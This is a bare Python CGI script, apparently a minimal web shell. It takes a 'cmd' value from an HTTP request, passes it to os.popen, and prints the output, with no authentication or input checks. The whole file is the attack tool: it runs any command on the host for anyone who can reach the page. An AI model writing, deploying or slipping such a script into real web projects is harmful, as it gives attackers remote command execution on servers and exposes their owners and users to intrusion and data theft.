#!/usr/bin/env python3
import os
import cgi

print("Content-Type: text/plain\n")

form = cgi.FieldStorage()
cmd = form.getvalue("cmd")

if cmd:
    output = os.popen(cmd).read()
    print(output)
else:
    print("No command provided.")

